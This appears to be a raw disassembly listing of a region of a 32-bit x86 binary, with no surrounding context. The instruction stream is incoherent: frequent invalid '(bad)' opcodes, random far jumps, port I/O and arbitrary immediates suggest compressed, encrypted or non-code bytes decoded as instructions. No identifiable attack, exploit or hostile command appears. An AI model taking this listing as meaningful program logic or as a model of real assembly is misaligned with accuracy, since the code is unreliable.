  4194dc:	(bad)  
  4194dd:	cwde   
  4194de:	jne    0x41949f
  4194e0:	outs   dx,DWORD PTR ds:[esi]
  4194e1:	repnz adc al,0x74
  4194e4:	inc    edx
  4194e5:	xchg   edi,eax
  4194e6:	and    edi,DWORD PTR [edx-0x56]
  4194e9:	into   
  4194ea:	mov    WORD PTR ds:0x38c7f64f,gs
  4194f0:	jp     0x419523
  4194f2:	imul   edi
  4194f4:	adc    DWORD PTR [edx+eax*2],ecx
  4194f7:	add    al,0x7e
  4194fa:	ins    BYTE PTR es:[edi],dx
  4194fb:	fwait
  4194fc:	pop    edi
  4194fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194fe:	add    ebp,ecx
  419500:	xor    bh,BYTE PTR [eax-0x639f39d3]
  419506:	das    
  419507:	test   DWORD PTR [ebx-0x66],ebp
  41950a:	data16 jbe 0x4194be
  41950d:	jns    0x41954f
  41950f:	in     al,0x76
  419511:	fistp  WORD PTR ds:0x77a1041a
  419517:	mov    ch,0x66
  419519:	shl    BYTE PTR [ecx+0x56],0x87
  41951d:	adc    BYTE PTR [eax+edi*8+0x73960ea6],al
  419524:	push   ebx
  419525:	mov    dl,0x69
  419527:	mov    ecx,edi
  419529:	inc    esi
  41952a:	mov    ds:0xb384b6fb,eax
  41952f:	mov    ebp,0x1d91b249
  419534:	pushf  
  419535:	ss push ss
  419537:	cli    
  419538:	gs lahf 
  41953a:	cmp    dl,dh
  41953c:	lods   eax,DWORD PTR ds:[esi]
  41953d:	stos   DWORD PTR es:[edi],eax
  41953e:	and    al,0x64
  419540:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  419542:	enter  0x85e,0x4a
  419546:	cmp    al,0xfd
  419548:	pop    ss
  419549:	mov    esp,0xc4895686
  41954e:	aad    0x3d
  419550:	lea    esp,[edx]
  419552:	cdq    
  419553:	ins    BYTE PTR es:[edi],dx
  419554:	mov    ebp,0xca52db47
  419559:	call   0xf55b:0xb43873f
  419560:	nop
  419561:	push   ecx
  419562:	in     al,dx
  419563:	es mov eax,0x9a949cd5
  419569:	inc    ebx
  41956a:	cmp    edx,ebp
  41956c:	dec    ebp
  41956d:	xchg   ebx,eax
  41956e:	mov    ds:0x316ab141,al
  419573:	and    ch,BYTE PTR [esi-0x59f5b5e1]
  419579:	mov    eax,0xeb5516d1
  41957e:	stos   BYTE PTR es:[edi],al
  41957f:	or     eax,0x929fdc16
  419584:	loopne 0x419577
  419586:	or     al,0x44
  419588:	fistp  QWORD PTR [eax]
  41958a:	aam    0x70
  41958c:	jle    0x419581
  41958e:	push   esp
  41958f:	mov    ds:0x6f8aa69f,eax
  419594:	push   esi
  419595:	daa    
  419596:	xchg   ecx,eax
  419597:	fldcw  WORD PTR [esi+0x50354fe6]
  41959d:	jl     0x4195d6
  41959f:	ds pop es
  4195a1:	xor    dh,ah
  4195a3:	enter  0x7709,0x81
  4195a7:	adc    DWORD PTR [edx-0x5f7f7482],ebx
  4195ad:	lock add ecx,DWORD PTR [edi-0x33]
  4195b1:	or     al,ah
  4195b3:	cdq    
  4195b4:	(bad)  
  4195b5:	scas   al,BYTE PTR es:[edi]
  4195b6:	pop    esi
  4195b7:	and    BYTE PTR ds:0x3b7092,0x5d
  4195be:	cmc    
  4195bf:	ret    0x5dce
  4195c2:	mov    bh,0xda
  4195c4:	popa   
  4195c5:	and    ah,BYTE PTR [esi]
  4195c7:	outs   dx,BYTE PTR ds:[esi]
  4195c8:	mov    eax,0xf0efd54f
  4195cd:	mov    esi,DWORD PTR [edx+0x322bc86]
  4195d3:	leave  
  4195d4:	or     eax,0x29edabd8
  4195d9:	inc    esp
  4195da:	out    0x81,al
  4195dc:	mov    ah,0x43
  4195de:	fs enter 0x9bff,0x94
  4195e3:	scas   eax,DWORD PTR es:[edi]
  4195e4:	xor    al,0xa3
  4195e6:	mov    BYTE PTR [ebp+0x66],0x9e
  4195ea:	jg     0x4195b5
  4195ec:	xchg   esp,eax
  4195ed:	and    eax,0xfbd8c705
  4195f2:	push   cs
  4195f3:	pop    esp
  4195f4:	ret    0xdbbe
  4195f7:	cwde   
  4195f8:	lock and DWORD PTR [eax-0x71],ebp
  4195fc:	(bad)  [edx-0x11]
  4195ff:	imul   edi,ebp,0x59
  419602:	pushf  
  419603:	aaa    
  419604:	adc    DWORD PTR [esi+0x7],0x1b
  419608:	sbb    BYTE PTR [edx-0x6caa5404],dh
  41960e:	jmp    0xff6de7b4
  419613:	in     al,0x71
  419615:	pushf  
  419616:	test   DWORD PTR [edx-0x6f],ebp
  419619:	scas   al,BYTE PTR es:[edi]
  41961a:	push   esi
  41961b:	jl     0x419659
  41961d:	xchg   edi,eax
  41961e:	es inc eax
  419620:	out    0xb9,eax
  419622:	mov    ds:0x100a9e45,al
  419627:	mov    ah,0xd0
  419629:	call   0xdeba2012
  41962e:	loope  0x419623
  419630:	js     0x41965c
  419632:	fdiv   QWORD PTR [edx-0x61]
  419635:	mov    ebp,0x66329c6f
  41963a:	mov    bh,0xc1
  41963c:	inc    esi
  41963d:	(bad)  
  41963e:	leave  
  41963f:	ins    BYTE PTR es:[edi],dx
  419640:	arpl   WORD PTR [edx+0x1a],bx
  419643:	enter  0xa3de,0x93
  419647:	or     eax,0x1e37a1df
  41964c:	sbb    DWORD PTR [ebx],ebp
  41964e:	sbb    ah,BYTE PTR [edx]
  419650:	pop    eax
  419651:	nop
  419652:	in     al,dx
  419653:	in     al,dx
  419654:	pop    eax
  419655:	mov    edi,0xcd82def4
  41965a:	inc    esp
  41965b:	fcomp  st(7)
  41965d:	push   edi
  41965e:	daa    
  41965f:	push   eax
  419660:	mov    DWORD PTR [edx+0x785e56a8],edx
  419666:	outs   dx,BYTE PTR ds:[esi]
  419667:	jmp    0x4196a2
  419669:	xor    eax,0xf9db88c
  41966e:	pop    eax
  41966f:	(bad)  
  419670:	stc    
  419671:	add    dl,dl
  419673:	js     0x4195fa
  419675:	adc    BYTE PTR [edi+0x68bc104d],bh
  41967b:	cmp    ch,dl
  41967d:	pop    es
  41967e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419680:	mov    ebp,0x904b8673
  419685:	std    
  419686:	pop    esp
  419687:	daa    
  419688:	and    al,0xa4
  41968a:	lds    esi,FWORD PTR [eax]
  41968c:	push   ebx
  41968d:	mov    al,0xd0
  41968f:	sbb    bh,BYTE PTR [ebx+0x2b2133b6]
  419695:	pusha  
  419696:	stos   DWORD PTR es:[edi],eax
  419697:	cdq    
  419698:	xor    ah,BYTE PTR [esi-0x1d]
  41969b:	sti    
  41969c:	sbb    ch,BYTE PTR [ebp+0x14157fb2]
  4196a2:	and    al,BYTE PTR [esi+0x5fc0e7cf]
  4196a8:	mov    ebx,0xa8df98db
  4196ad:	call   0x57539312
  4196b2:	or     dl,al
  4196b4:	test   BYTE PTR [ebp+0x24],dh
  4196b7:	xchg   ebx,eax
  4196b8:	aaa    
  4196b9:	jmp    0x452fc62c
  4196be:	and    cl,BYTE PTR [edx+edi*2]
  4196c1:	jge    0x4196dd
  4196c3:	mov    esp,DWORD PTR [ebx+0x4cf3d68f]
  4196c9:	hlt    
  4196ca:	cs leave 
  4196cc:	xchg   ebx,eax
  4196cd:	popf   
  4196ce:	dec    esp
  4196cf:	imul   ebx,DWORD PTR [edi],0x170c4dd3
  4196d5:	cmp    dh,BYTE PTR [edx+esi*8-0x7a72ce8c]
  4196dc:	or     bp,cx
  4196df:	out    0x17,al
  4196e1:	add    ch,BYTE PTR [eax-0x30859832]
  4196e7:	cld    
  4196e8:	jns    0x4196d8
  4196ea:	hlt    
  4196eb:	xchg   DWORD PTR [ecx+0x7cac4766],edx
  4196f1:	jbe    0x419698
  4196f3:	imul   edx,ebp,0x6a51799c
  4196f9:	leave  
  4196fa:	pop    ebx
  4196fb:	dec    ebp
  4196fc:	jecxz  0x4196ef
  4196fe:	and    bh,al
  419700:	out    dx,eax
  419701:	and    ebp,DWORD PTR [ebx]
  419703:	test   eax,0xafe51a14
  419708:	ror    eax,1
  41970a:	imul   edi,DWORD PTR [edx],0x53
  41970d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41970e:	out    dx,al
  41970f:	cmp    eax,0x1b73f18a
  419714:	add    BYTE PTR [esi-0x7d],al
  419717:	inc    ecx
  419718:	(bad)  [eax-0x7b156f4f]
  41971e:	or     al,0xd1
  419720:	pushf  
  419721:	push   esi
  419722:	jno    0x419734
  419724:	add    cl,BYTE PTR [esp+ebp*4]
  419727:	je     0x419724
  419729:	das    
  41972a:	mov    edx,0x45f8a8ce
  41972f:	bound  eax,QWORD PTR [edx+0x5d]
  419732:	inc    ecx
  419733:	enter  0xa145,0x26
  419737:	dec    ecx
  419738:	adc    esp,ebp
  41973a:	add    eax,0xd80f221b
  41973f:	jecxz  0x4196fe
  419741:	fbld   TBYTE PTR [edx+0x48e396af]
  419747:	popa   
  419748:	cmp    ecx,DWORD PTR [esi]
  41974a:	loopne 0x4197ba
  41974c:	or     ebx,DWORD PTR [eax-0x4035f502]
  419752:	sbb    dl,BYTE PTR [esi]
  419754:	push   0xa2dbb261
  419759:	imul   edx,DWORD PTR [esi+0x419b61b7],0x2b45f020
  419763:	(bad)  
  419765:	scas   eax,DWORD PTR es:[edi]
  419766:	mov    ecx,0x4727422a
  41976b:	cmp    al,0x96
  41976d:	cmc    
  41976e:	mov    edx,0xb85b7983
  419773:	(bad)  
  419774:	sub    esi,esp
  419776:	push   ebx
  419777:	in     al,0x2
  419779:	jle    0x4197de
  41977b:	inc    edi
  41977c:	push   ss
  41977d:	push   eax
  41977e:	pusha  
  41977f:	rcr    DWORD PTR [eax],0x2a
  419782:	ror    BYTE PTR [esi-0x1e645236],1
  419788:	imul   ebp,edx,0xbe47d77b
  41978e:	pushf  
  41978f:	pop    esi
  419790:	ret    0x59b2
  419793:	ret    
  419794:	inc    ebx
  419795:	or     BYTE PTR [ebp+0x504f9247],0x3c
  41979c:	test   BYTE PTR es:[eax+edi*4+0x4e0fa052],dl
  4197a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197a5:	retf   
  4197a6:	imul   esp,DWORD PTR [edx],0x2bd35633
  4197ac:	xor    ah,ah
  4197ae:	inc    ebp
  4197af:	bound  edi,QWORD PTR [eax+0x9]
  4197b2:	rol    DWORD PTR [eax-0x40472ad6],cl
  4197b8:	gs js  0x4197c4
  4197bb:	out    0xac,eax
  4197bd:	in     eax,dx
  4197be:	ficomp WORD PTR [edi]
  4197c0:	sub    al,BYTE PTR [esi+0x2c]
  4197c3:	es das 
  4197c5:	fbld   TBYTE PTR [ebp-0xcd58d5c]
  4197cb:	imul   DWORD PTR [edi+0x4a79fb20]
  4197d1:	and    dh,BYTE PTR [edi-0x5686fed2]
  4197d7:	pop    edx
  4197d8:	nop
  4197d9:	pop    ebx
  4197db:	rcr    DWORD PTR [ecx],1
  4197dd:	out    0xb2,eax
  4197df:	push   ecx
  4197e0:	adc    dl,BYTE PTR [esi-0x3c]
  4197e3:	loop   0x419834
  4197e5:	aad    0xb8
  4197e7:	jecxz  0x419781
  4197e9:	cmp    DWORD PTR [esi-0x79],ebp
  4197ec:	fiadd  DWORD PTR [ecx]
  4197ee:	sbb    ebx,DWORD PTR [edi+edi*1+0x3d]
  4197f2:	dec    ebp
  4197f3:	sbb    eax,0x7009cbb6
  4197f8:	add    DWORD PTR [ebx],edx
  4197fa:	mov    edx,0x8e3619c
  4197ff:	sub    ecx,ebp
  419801:	adc    al,0xf6
  419803:	xchg   esp,eax
  419804:	ins    BYTE PTR es:[edi],dx
  419805:	pop    ss
  419806:	(bad)  
  419807:	rcl    BYTE PTR [esi+0x56],1
  41980a:	cmc    
  41980b:	cs pop edi
  41980d:	lea    edi,[di-0xaf0]
  419812:	pop    ecx
  419813:	sub    DWORD PTR [edx+eax*2+0x2a],ecx
  419817:	and    eax,0x93db2f23
  41981c:	lods   al,BYTE PTR ds:[esi]
  41981d:	popf   
  41981e:	lods   al,BYTE PTR ds:[esi]
  41981f:	fdiv   DWORD PTR [esp+ebp*4-0x2e0da62f]
  419826:	sub    cl,ah
  419828:	xor    esp,DWORD PTR [ecx-0x2d844a5c]
  41982e:	jg     0x4197e3
  419830:	jle    0x4198a4
  419832:	xlat   BYTE PTR ds:[ebx]
  419833:	and    eax,0xc75fc9a5
  419838:	inc    edi
  419839:	cmp    BYTE PTR [ebx-0x67],dh
  41983c:	jle    0x4197c4
  41983e:	jmp    0x3992:0xbdbd43eb
  419845:	mov    cl,0x62
  419847:	xchg   esp,eax
  419848:	xchg   edx,esi
  41984a:	outs   dx,DWORD PTR ds:[esi]
  41984b:	mov    ecx,0x207044
  419850:	mov    esp,0x7f41ad7
  419855:	pop    eax
  419856:	pop    esi
  419857:	adc    ebx,DWORD PTR [esi]
  419859:	mov    edx,0x39b8d0d4
  41985e:	out    dx,al
  41985f:	adc    eax,DWORD PTR [edx-0x29a03038]
  419865:	test   eax,0xb7d46a29
  41986a:	das    
  41986b:	lahf   
  41986c:	test   dl,ah
  41986e:	xor    DWORD PTR [ecx-0x71],esi
  419871:	test   al,0xd5
  419873:	cmp    ah,BYTE PTR [edx]
  419875:	dec    edi
  419876:	(bad)  
  419877:	je     0x41986c
  419879:	push   eax
  41987a:	inc    ebp
  41987b:	sbb    DWORD PTR [eax-0x80],ebx
  41987e:	or     al,0x11
  419880:	hlt    
  419881:	inc    ebx
  419882:	das    
  419883:	mov    edx,0xf55f522
  419888:	pusha  
  419889:	sar    edx,0xd3
  41988c:	pop    ecx
  41988d:	adc    al,0x2
  41988f:	xchg   esp,eax
  419890:	mov    eax,0xd870d753
  419895:	dec    ebp
  419896:	jne    0x41989f
  419898:	mov    bh,0xb1
  41989a:	mov    ebp,0x6c77f9dc
  41989f:	or     BYTE PTR [ebp-0x7099d393],al
  4198a5:	push   edx
  4198a6:	pxor   mm6,QWORD PTR [edi]
  4198a9:	int    0x9d
  4198ab:	lods   al,BYTE PTR ds:[esi]
  4198ac:	fbstp  TBYTE PTR [eax-0x398db5a7]
  4198b2:	adc    bh,BYTE PTR ds:0x7802df5b
  4198b8:	ja     0x4198b7
  4198ba:	fs jmp 0x735b00c0
  4198c0:	xchg   esp,eax
  4198c1:	or     al,0x8f
  4198c3:	addr16 int 0x63
  4198c6:	fdivr  DWORD PTR [ecx-0x76]
  4198c9:	sbb    eax,ecx
  4198cb:	push   edi
  4198cc:	ja     0x4198bf
  4198ce:	test   al,0xa4
  4198d0:	add    eax,0xc106830b
  4198d5:	inc    esp
  4198d6:	popf   
  4198d7:	leave  
  4198d8:	jns    0x4198b7
  4198da:	popa   
  4198db:	cli    
  4198dc:	ficom  DWORD PTR [ebp-0x32]
  4198df:	jl     0x41995e
  4198e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198e2:	addr16 aad 0x47
  4198e5:	in     eax,0x57
  4198e7:	or     ebx,ecx
  4198e9:	dec    edi
  4198ea:	ret    
  4198eb:	ja     0x41995a
  4198ed:	sub    eax,0x6ae84184
  4198f2:	test   eax,0xcc81a9e6
  4198f7:	stos   DWORD PTR es:[edi],eax
  4198f8:	clc    
  4198f9:	jb     0x4198bd
  4198fb:	ret    0x788c
  4198fe:	jle    0x41993e
  419900:	xor    al,0x96
  419902:	mov    esi,0x8ace3da
  419907:	leave  
  419908:	(bad)  
  419909:	repnz enter 0x848d,0x75
  41990e:	lods   eax,DWORD PTR ds:[esi]
  41990f:	xor    BYTE PTR [edx],al
  419911:	mov    ebx,0x48e38efb
  419916:	dec    edx
  419917:	add    al,0x21
  419919:	ins    BYTE PTR es:[edi],dx
  41991a:	shl    BYTE PTR [ebp+0x340e41bc],1
  419920:	xchg   ebx,eax
  419921:	fdivr  DWORD PTR [edx+0x250ebd74]
  419927:	int3   
  419928:	dec    esi
  419929:	out    dx,al
  41992a:	int3   
  41992b:	cmp    eax,0xea55783f
  419930:	jo     0x41991c
  419932:	or     eax,0xab6405e2
  419937:	and    ecx,esi
  419939:	push   edx
  41993a:	mov    BYTE PTR [eax],ch
  41993c:	cmp    BYTE PTR [edi],dl
  41993e:	std    
  41993f:	push   ds
  419940:	xchg   ebx,edx
  419942:	gs push cs
  419944:	fisub  WORD PTR [edx+0x72]
  419947:	push   ebp
  419948:	rcr    bl,0x6b
  41994b:	dec    ebx
  41994c:	pop    esi
  41994d:	aad    0xb
  41994f:	popa   
  419950:	fwait
  419951:	sbb    BYTE PTR [ecx],ch
  419953:	mov    cl,0x99
  419955:	pusha  
  419956:	shl    BYTE PTR [ecx],cl
  419958:	cmc    
  419959:	cdq    
  41995a:	jle    0x419966
  41995c:	dec    esi
  41995d:	cs sbb al,0xa3
  419960:	push   ds
  419961:	push   edi
  419962:	div    BYTE PTR [ebp+0x2e]
  419965:	mov    WORD PTR [eax-0x7c159162],?
  41996b:	inc    esi
  41996c:	pop    eax
  41996d:	fcom   QWORD PTR [ebp+0x5ced4ed6]
  419973:	sub    eax,0xc7e20eaa
  419978:	enter  0xca3c,0x97
  41997c:	push   ecx
  41997d:	push   ebp
  41997e:	and    BYTE PTR [ebx-0x2],ah
  419981:	fild   DWORD PTR ds:0x13602692
  419987:	pop    ebp
  419988:	sahf   
  419989:	push   0x49
  41998b:	ja     0x419922
  41998d:	ins    BYTE PTR es:[edi],dx
  41998e:	jnp    0x41992a
  419990:	loope  0x41991c
  419992:	outs   dx,BYTE PTR ds:[esi]
  419993:	stc    
  419994:	stos   DWORD PTR es:[edi],eax
  419995:	xor    eax,0xd8df9aa
  41999a:	(bad)
  41999d:	jne    0x419a09
  41999f:	add    eax,0x6e53409
  4199a4:	sub    BYTE PTR [ebx+0x58],ah
  4199a7:	js     0x419984
  4199a9:	sub    al,0xe8
  4199ab:	or     BYTE PTR [ebx],0x3
  4199ae:	and    eax,0x2e3d941e
  4199b3:	push   ebp
  4199b4:	sahf   
  4199b5:	int    0x1f
  4199b7:	aaa    
  4199b8:	loopne 0x419986
  4199ba:	std    
  4199bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199bc:	pop    es
  4199bd:	mov    eax,ds:0xdc99f128
  4199c2:	xor    DWORD PTR [edi+esi*1-0x42700a68],edi
  4199c9:	inc    esp
  4199ca:	xchg   esi,eax
  4199cb:	or     edi,DWORD PTR [eax+edx*1+0x72]
  4199cf:	inc    ecx
  4199d0:	jl     0x4199dc
  4199d2:	inc    ebx
  4199d3:	jle    0x419a17
  4199d5:	and    dh,ch
  4199d7:	inc    esi
  4199d8:	dec    edx
  4199d9:	lods   eax,DWORD PTR ds:[esi]
  4199da:	or     eax,0x7dc62168
  4199df:	add    ebp,DWORD PTR [eax+0x675cdfbd]
  4199e5:	cmp    BYTE PTR [esi+edi*4-0x24],al
  4199e9:	fucomp st(1)
  4199eb:	out    dx,eax
  4199ec:	stos   BYTE PTR es:[edi],al
  4199ed:	js     0x4199c5
  4199ef:	xchg   esi,ebp
  4199f1:	popa   
  4199f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199f3:	std    
  4199f4:	push   eax
  4199f5:	loop   0x41999a
  4199f7:	mov    ecx,0x1ac90e6e
  4199fc:	leave  
  4199fd:	stos   DWORD PTR es:[edi],eax
  4199fe:	loopne 0x4199cb
  419a00:	add    BYTE PTR [esi-0x7967eadb],dl
  419a06:	jae    0x4199eb
  419a08:	cs int3 
  419a0a:	pop    edx
  419a0b:	push   es
  419a0c:	xor    esp,DWORD PTR [eax]
  419a0e:	lock xor ah,BYTE PTR ds:0x32f63436
  419a15:	sti    
  419a16:	jge    0x419a95
  419a18:	lods   al,BYTE PTR ds:[esi]
  419a19:	xchg   edi,eax
  419a1a:	sahf   
  419a1b:	mov    edx,0xc016002b
  419a20:	inc    esi
  419a21:	pop    esi
  419a22:	push   ds
  419a23:	push   0x5bd7b9db
  419a28:	jmp    DWORD PTR [ebp+eiz*2+0x5d4db6b5]
  419a2f:	bt     DWORD PTR [ebx-0x36],ebx
  419a33:	and    DWORD PTR [esi-0x29f53cd9],ebx
  419a39:	shl    edi,cl
  419a3b:	dec    esp
  419a3c:	popf   
  419a3d:	test   BYTE PTR [ebp-0xbbeafb4],bh
  419a43:	scas   eax,DWORD PTR es:[edi]
  419a44:	push   ebp
  419a45:	inc    esp
  419a46:	pusha  
  419a47:	popf   
  419a48:	or     dh,dl
  419a4a:	fisttp DWORD PTR [esi-0x5f754fe0]
  419a50:	out    dx,al
  419a51:	sbb    ah,BYTE PTR [edx]
  419a53:	sbb    BYTE PTR [edx-0x51],dh
  419a56:	adc    ebx,esi
  419a58:	nop
  419a59:	lods   al,BYTE PTR ds:[esi]
  419a5a:	not    DWORD PTR [eax+0x4e]
  419a5d:	jns    0x419a56
  419a5f:	cmc    
  419a60:	cwde   
  419a61:	lahf   
  419a62:	push   ds
  419a63:	mov    edx,0xa8593994
  419a68:	or     ebp,DWORD PTR [ebx+0x3522dbf5]
  419a6e:	dec    ebp
  419a6f:	dec    ebp
  419a70:	test   al,0x8c
  419a72:	idiv   DWORD PTR [ebx]
  419a74:	add    DWORD PTR [edx-0x3ec20c99],ecx
  419a7a:	(bad)  
  419a7c:	mov    ch,0xa5
  419a7e:	jae    0x419ac6
  419a80:	enter  0xa99b,0x1b
  419a84:	frstor [esi-0x32]
  419a87:	jg     0x419ae9
  419a89:	pop    edi
  419a8a:	add    eax,0x1f362fe8
  419a8f:	ins    DWORD PTR es:[edi],dx
  419a90:	fwait
  419a91:	pop    ecx
  419a92:	(bad)  
  419a93:	repz pop esi
  419a95:	rcr    bl,cl
  419a97:	cwde   
  419a98:	stos   BYTE PTR es:[edi],al
  419a99:	out    dx,eax
  419a9a:	sbb    eax,0x1953b95c
  419a9f:	jecxz  0x419a36
  419aa1:	xchg   edx,eax
  419aa2:	sti    
  419aa3:	in     al,0xf0
  419aa5:	mov    esp,0x8962dcf
  419aaa:	or     edi,ecx
  419aac:	push   esi
  419aad:	push   ss
  419aae:	mov    al,0xfb
  419ab0:	arpl   dx,dx
  419ab2:	lock sub bh,ah
  419ab5:	mov    cl,0xc4
  419ab7:	jge    0x419aad
  419ab9:	pop    esp
  419aba:	push   edi
  419abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419abc:	ret    
  419abd:	stos   DWORD PTR es:[edi],eax
  419abe:	outs   dx,DWORD PTR ds:[esi]
  419abf:	sbb    dl,BYTE PTR [ebp-0x1e]
  419ac2:	xchg   ebx,eax
  419ac3:	rcr    ebp,0x22
  419ac6:	lds    esp,FWORD PTR [ecx+0x4a]
  419ac9:	shl    BYTE PTR [ecx+0x74],cl
  419acc:	add    BYTE PTR [ebp+0x1eb5c05f],0x28
  419ad3:	jmp    0xa443:0x8b5ceed8
  419ada:	adc    BYTE PTR [edx+0x77fdd41c],ch
  419ae0:	push   0xffffffb6
  419ae2:	jo     0x419afc
  419ae4:	(bad)  
  419ae5:	pop    edi
  419ae6:	sub    eax,0xa656251a
  419aeb:	sbb    eax,0xb85394b0
  419af0:	pop    ds
  419af1:	out    dx,al
  419af2:	dec    eax
  419af3:	xor    edx,DWORD PTR [ecx-0x5241e72d]
  419af9:	xor    ah,BYTE PTR [edx]
  419afb:	mov    esp,0x838970db
  419b01:	sti    
  419b02:	push   edi
  419b03:	mov    ebp,0xce4e2fc
  419b08:	sbb    ch,BYTE PTR [eax-0x36]
  419b0b:	adc    edi,ebx
  419b0d:	lods   al,BYTE PTR ds:[esi]
  419b0e:	sbb    bl,BYTE PTR [edi]
  419b10:	lock xor DWORD PTR ds:0x3850884c,ecx
  419b17:	daa    
  419b18:	and    esi,esi
  419b1a:	shl    BYTE PTR [ecx-0x23369d6c],0x55
  419b21:	sti    
  419b22:	dec    eax
  419b23:	sbb    al,0x8e
  419b25:	leave  
  419b26:	fnstsw WORD PTR [edx-0x44]
  419b29:	sub    al,0x54
  419b2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b2c:	leave  
  419b2d:	call   0x32698b9f
  419b32:	inc    eax
  419b33:	lahf   
  419b34:	scas   eax,DWORD PTR es:[edi]
  419b35:	sub    ecx,eax
  419b37:	xchg   esp,eax
  419b38:	adc    al,0x6
  419b3a:	jne    0x419b97
  419b3c:	adc    DWORD PTR [ebx],0xe8684a6e
  419b42:	mov    cs,WORD PTR [edx+0x6c]
  419b45:	or     DWORD PTR [ecx-0x8],ebp
  419b48:	jmp    0x9abd:0xd3ac3ba9
  419b4f:	rcl    DWORD PTR [esi-0x7ce2581e],0x1f
  419b56:	lods   eax,DWORD PTR ds:[esi]
  419b57:	adc    BYTE PTR ss:[edi-0x4b],0xc
  419b5c:	xor    BYTE PTR [ecx+0x6e70dba4],ah
  419b62:	sub    DWORD PTR [eax-0x47ae054d],ebx
  419b68:	adc    al,0xb1
  419b6a:	pushf  
  419b6b:	sub    eax,edi
  419b6d:	retf   
  419b6e:	jae    0x419afc
  419b70:	test   DWORD PTR [eax+0x608757fc],edi
  419b76:	or     al,0x9
  419b78:	pop    ebx
  419b79:	inc    esi
  419b7a:	rol    DWORD PTR [eax],1
  419b7c:	fbld   TBYTE PTR [eax-0x77]
  419b7f:	jne    0x419b0b
  419b81:	and    ch,dl
  419b83:	repnz pop ebp
  419b85:	xchg   edx,eax
  419b86:	jle    0x419b4c
  419b88:	outs   dx,DWORD PTR ds:[esi]
  419b89:	pop    esi
  419b8a:	adc    eax,DWORD PTR [ecx]
  419b8c:	jg     0x419b5c
  419b8e:	jnp    0x419b2d
  419b90:	mov    DWORD PTR [edi-0x52fdbbcb],ebp
  419b96:	mov    eax,0x84f72604
  419b9b:	xchg   esp,eax
  419b9c:	div    BYTE PTR [ecx+edi*2-0x34]
  419ba0:	jmp    0x33366cc2
  419ba5:	jns    0x419c0b
  419ba7:	sbb    ecx,DWORD PTR [eax+0x27]
  419baa:	xor    eax,DWORD PTR [ebx-0xa]
  419bad:	dec    eax
  419bae:	int3   
  419baf:	test   DWORD PTR gs:[edx],ebx
  419bb2:	inc    esi
  419bb3:	sar    DWORD PTR [ebx-0x2ae2b611],0xd
  419bba:	adc    DWORD PTR [ebp-0x4e],0xfffffffb
  419bbe:	mov    edx,0x6d14ca0e
  419bc3:	xor    BYTE PTR [esi+0x31],ch
  419bc6:	adc    bl,BYTE PTR [ecx]
  419bc8:	cmp    BYTE PTR [edx],dh
  419bca:	int3   
  419bcb:	sti    
  419bcc:	retf   0xe5a7
  419bcf:	pop    ebp
  419bd0:	jbe    0x419be5
  419bd2:	shl    BYTE PTR [ecx+esi*1-0x4fb70693],cl
  419bd9:	and    al,0x11
  419bdb:	mov    ebp,0x54e15405
  419be0:	push   0x36
  419be2:	jg     0x419c09
  419be4:	or     al,0x75
  419be6:	mov    ch,0xa7
  419be8:	fsubr  st,st(7)
  419bea:	sub    DWORD PTR [ebx+0x77],ebx
  419bed:	out    0xbd,eax
  419bef:	(bad)  [edi-0x7]
  419bf2:	outs   dx,DWORD PTR ds:[esi]
  419bf3:	pop    ebp
  419bf4:	int3   
  419bf5:	mov    ebp,0xec28c35d
  419bfa:	jle    0x419c4d
  419bfc:	call   0x96d831b8
  419c01:	and    ecx,DWORD PTR [esi]
  419c03:	mov    cl,0x68
  419c05:	cwde   
  419c06:	nop
  419c07:	adc    eax,0xdfb2cc91
  419c0c:	mov    DWORD PTR [edi+edx*8+0x55661918],0xe534156c
  419c17:	pop    ebx
  419c18:	lock mov esp,esi
  419c1b:	xchg   esi,eax
  419c1c:	gs cld 
  419c1e:	inc    esp
  419c1f:	add    dl,ah
  419c21:	or     al,0xac
  419c23:	into   
  419c24:	lock ins DWORD PTR es:[edi],dx
  419c26:	sub    al,0x59
  419c28:	pop    ebp
  419c29:	imul   ecx,DWORD PTR [edi],0xffffff89
  419c2c:	es mov dl,0x9e
  419c2f:	sub    DWORD PTR [eax],edi
  419c31:	int3   
  419c32:	sbb    edx,DWORD PTR [eax-0x73ef5d35]
  419c38:	sub    eax,0xf29a542a
  419c3d:	mov    ebp,0x7cccb9f2
  419c42:	fs popa 
  419c44:	mov    ecx,0xd9be3498
  419c49:	cmp    al,0x54
  419c4b:	xor    al,0x84
  419c4d:	jecxz  0x419c2f
  419c4f:	pop    ebx
  419c50:	push   ebp
  419c51:	arpl   WORD PTR [esi-0x3a],bp
  419c54:	push   edi
  419c55:	les    edi,FWORD PTR [eax-0x3a]
  419c58:	imul   DWORD PTR [eax]
  419c5a:	sub    ebp,edx
  419c5c:	mov    dl,0x92
  419c5e:	push   0x5feeb7cc
  419c63:	scas   eax,DWORD PTR es:[edi]
  419c64:	and    al,0xcb
  419c66:	mov    esp,0x76b03b3
  419c6b:	xor    BYTE PTR [eax+0x7b],bh
  419c6e:	in     al,dx
  419c6f:	adc    DWORD PTR [edi],ebx
  419c71:	sbb    al,0x91
  419c73:	jp     0x419c4f
  419c75:	dec    edi
  419c76:	push   ecx
  419c77:	push   edi
  419c78:	add    BYTE PTR [ecx+0x29],bh
  419c7b:	ins    DWORD PTR es:[edi],dx
  419c7c:	or     DWORD PTR [edi],eax
  419c7e:	adc    DWORD PTR [edi],ebx
  419c80:	mov    ch,cl
  419c82:	pop    esp
  419c83:	xchg   ebp,eax
  419c84:	adc    eax,0xc358f514
  419c89:	xchg   BYTE PTR [ebp-0x1d10eb12],dh
  419c8f:	inc    ecx
  419c90:	call   0x5aada224
  419c95:	loopne 0x419d07
  419c97:	pop    DWORD PTR [esi+0x3b5dc1dc]
  419c9d:	sub    esp,DWORD PTR [ebp-0x2175307b]
  419ca3:	sub    al,0xd3
  419ca5:	inc    ecx
  419ca6:	ret    
  419ca7:	jp     0x419d04
  419ca9:	fnstsw WORD PTR [edi]
  419cab:	mov    dh,0xe7
  419cad:	xlat   BYTE PTR ds:[ebx]
